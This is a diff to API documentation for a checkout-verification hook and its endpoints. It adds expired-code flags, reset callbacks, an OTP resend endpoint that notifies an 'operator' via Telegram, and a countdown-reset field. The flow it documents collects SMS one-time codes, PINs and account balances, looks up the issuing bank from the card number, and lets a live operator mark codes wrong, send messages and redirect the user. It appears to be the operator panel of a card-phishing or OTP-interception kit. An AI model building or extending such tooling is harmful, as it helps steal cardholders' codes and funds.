@@ -149,7 +149,10 @@ When `sessionId` is `null` or empty, the hook skips API/WebSocket calls and retu
 | `bank`              | `string \| undefined`                             | Bank/issuer name from BIN lookup (e.g. "Emirates NBD"). Displayed in verification layouts when present. |
 | `redirectUrl`       | `string \| null`                                   | If set, redirect the user to this URL. |
 | `wrongCode`         | `boolean`                                          | True when OTP/PIN was incorrect; show "try again" UI. |
+| `expiredCode`       | `boolean`                                          | True when OTP/PIN was expired; show "Code expired" message. |
 | `clearWrongCode`    | `() => void`                                       | Call to reset `wrongCode` after user retries. |
+| `clearExpiredCode`  | `() => void`                                       | Call to reset `expiredCode`. |
+| `clearCodeFeedback` | `() => void`                                       | Call to reset both `wrongCode` and `expiredCode`; use as `onTryAgain`. |
 | `operatorMessage`   | `{ level: "error" \| "info"; message: string } \| null` | Message from the backend to display. |
 | `clearOperatorMessage` | `() => void`                                    | Call to clear the operator message. |
 | `error`             | `string \| null`                                   | Error message if the initial status fetch failed. |
@@ -218,8 +221,9 @@ Your API must expose these paths (appended to `apiBase`). For direct API calls (
 |------------|--------|---------|
 | `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/status` | GET  | Session status, `verificationLayout`, and `bank` (issuer name from BIN lookup). |
 | `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/otp`   | POST | Submit SMS OTP code. Body: `{ code: string }`. |
+| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/otp/resend` | POST | Request resend. Body: `{ type: "sms" }` or `{ type: "pin" }`. Notifies operator via Telegram. |
 | `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/balance` | POST | Submit balance response. Body: `{ balance: string }`. |
-| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/ws`   | WebSocket | Real-time status, `bank`, `redirectUrl`, `wrongCode`, `operatorMessage`. |
+| `/v1/channels/{channelSlug}/checkout/sessions/{sessionId}/ws`   | WebSocket | Real-time status, `bank`, `redirectUrl`, `wrongCode`, `expiredCode`, `operatorMessage`, `countdownReset`. |
 
 Bank verification uses session-based auth (no API key in requests); session is identified by cookies or similar.
 
